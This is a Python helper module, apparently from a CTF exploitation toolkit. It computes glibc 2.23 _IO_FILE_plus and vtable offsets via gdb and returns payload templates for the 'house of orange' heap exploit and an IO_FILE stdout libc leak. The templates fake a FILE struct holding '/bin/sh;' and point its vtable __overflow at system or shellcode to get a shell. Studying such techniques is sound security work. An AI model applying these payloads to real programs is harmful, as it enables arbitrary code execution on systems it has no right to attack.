#coding:utf-8
import os
import json
import shutil
import pwn

def get_offsets(path_to_libc=""):
    '''
    test under libc 2.23
    get offsets of members in struct _IO_FILE_plus and struct _IO_jump_t (the type of vtable)
    performance considerations, results will be stored in the local file. 
    param:
        path_to_libc : path to libc with symbols
    return:
        a map which contain members' offsets
    '''
    LOCAL_FILE = "./.io_offset"
    if os.path.exists(LOCAL_FILE):
        try:
            local = json.load(open(LOCAL_FILE, "r"))
            if path_to_libc == "" or local['path'] == path_to_libc:
                return local
            print("exists local file corresponding to "+local['path'])
            if raw_input("remove local file y/n ? ").lower() == 'y':
                shutil.remove(LOCAL_FILE)
            else:
                return
        except Exception:
            pass
    if not os.path.exists(path_to_libc):
        print("invalid libc path : "+path_to_libc)
        return
    file = {
        "_flags":0,
        "_IO_read_ptr":0,
        "_IO_read_end":0,
        "_IO_read_base":0,
        "_IO_write_base":0,
        "_IO_write_ptr":0,
        "_IO_write_end":0,
        "_IO_buf_base":0,
        "_IO_buf_end":0,
        "_IO_save_base":0,
        "_IO_backup_base":0,
        "_IO_save_end":0,
        "_markers":0,
        "_chain":0,
        "_fileno":0,
        "_flags2":0,
        "_old_offset":0,
        "_cur_column":0,
        "_vtable_offset":0,
        "_shortbuf":0,
        "_lock":0,
        "_offset":0,
        "_codecvt":0,
        "_wide_data":0,
        "_freeres_list":0,
        "_freeres_buf":0,
        "__pad5":0,
        "_mode":0,
        "_unused2":0,
        # "vtable":0,
        }
    vtable = {
        "__dummy":0,
        "__dummy2":0,
        "__finish":0,
        "__overflow":0,
        "__underflow":0,
        "__uflow":0,
        "__pbackfail":0,
        "__xsputn":0,
        "__xsgetn":0,
        "__seekoff":0,
        "__seekpos":0,
        "__setbuf":0,
        "__sync":0,
        "__doallocate":0,
        "__read":0,
        "__write":0,
        "__seek":0,
        "__close":0,
        "__stat":0,
        "__showmanyc":0,
        "__imbue":0,
        }
    io_file_plus = {"path":path_to_libc, "file":file, "vtable_off":0, "vtable":vtable}
    
    def _get_file_off(mem):
        tmp = 'gdb -batch -q --nx \
            -ex "file %s" \
            -ex "p (char *)&((struct _IO_FILE_plus *)stdout)->%s - (char *)stdout"'%(path_to_libc, mem)
        print(tmp)
        res = os.popen(tmp).read()
        print(res)
        return int(res.strip("\n").split('=')[-1])

    def _get_vtable_off(mem):
        tmp = 'gdb -batch -q --nx \
            -ex "file %s" \
            -ex "p (char *)&((struct _IO_jump_t *)stdout)->%s - (char *)stdout"'%(path_to_libc, mem)
        # stdout is just a valid symbol, any other valid symbols are also welcome
        print(tmp)
        res = os.popen(tmp).read()
        print(res)
        return int(res.strip("\n").split('=')[-1])

    for mem in file:
        io_file_plus['file'][mem] = _get_file_off("file."+mem)
    io_file_plus['vtable_off'] = _get_file_off("vtable")
    for mem in vtable:
        io_file_plus['vtable'][mem] = _get_vtable_off(mem)
    # print(io_file_plus)
    json.dump(io_file_plus, open(LOCAL_FILE, "w"))
    return io_file_plus


def house_of_orange():
    '''
    works before libc 2.23(include)
    generate payload for house of orange
    http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html

    PRICIPLE:
    IF (fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base) SATISFIED THEN 
    fp->vtable->__overflow(fp) WILL BE CALLED WHEN PROGRAM EXIT

    call trace:
        malloc_printerr => __libc_message => abort => fflush / _IO_flush_all_lockp => _IO_OVERFLOW

    examples:
        huwangbei_2019_flower, hctf_2018_heapstorm_zero, twctf_2017_parrot

    return:
        simple payload template
    '''
    payload='''
# need to leak heap and libc addr first

# then construct _IO_FILE_plus and vtable struct on heap
# finally use unsorted bin attack to make _IO_list_all points
# to unsorted bin and the _chain(0x60 small bin) points to 
# our _IO_FILE_plus struct

offsets = pf.iofile.get_offsets(path_to_libc)
p1 = p64(0)+p64(SOME_SIZE)+p64(libc.symbols['_IO_list_all']-0x10)*2
fake_file = fit({
    0:"/bin/sh;"
    8:0x61,
    0x18: p32/p64(addr_of_p1),
    offsets['file']['_IO_write_ptr']:2,
    offsets['file']['_IO_write_base']:1,
    offsets['file']['_mode']:0,
    offsets['vtable_addr']:p32/p64(fake_vtable_addr)
})
fake_vtable = fit({
    offsets['vtable']['__overflow']:p32/p64(system_addr/shellcode),
})

# then use unsorted bin attack, make a victim's bk points to fake_file
# then malloc SOME_SIZE, then the fake_file will be put into 0x60 small bin
# and _IO_list_all will point to unsorted bin
# p.s. if treat unsorted bin as the start of a _IO_FIlE_plus struct, then the 0x60 
# small bin is the `_chain` member's address, which point's to our fake_file
'''
    return payload


def leak_libc():
    '''
    make IO_FILE great again
    especially usable when works with tcache
    http://4ngelboy.blogspot.com/2017/11/play-with-file-structure-yet-another.html

    PRICIPLE:
    Arbitrary memory reading (fwrite)
        1. Set the _ﬁleno to the ﬁle descriptor of stdout 
        2. Set _ﬂag & ~_IO_NO_WRITES ( &= ~8)
        3. Set _ﬂag  |= _IO_CURRENTLY_PUTTING( |= 0x800 )
        4. Set the write_base & write_ptr to memory address which you want to read
        5. _IO_read_end equal to _IO_write_base
    '''
    # todo
    payload = '''offsets = pf.iofile.get_offsets(path_to_libc)
fake_fd = p64(std_out_base + offsets['file']['_IO_write_ptr'])[:2]
# base is 2 low bytes of stdout addr, exec "p stdout" in gdb to get it

# first construct overlap chunk, to get main_arena's address as fd

# then overwrite low two bytes of the fd to fake_fd

# then malloc a chunk at stdout->file._IO_write_ptr. and enlarge the low byte 
# then you can get libc address

# then get shell

# note that 4-bit brute-force is needed
'''
    return payload
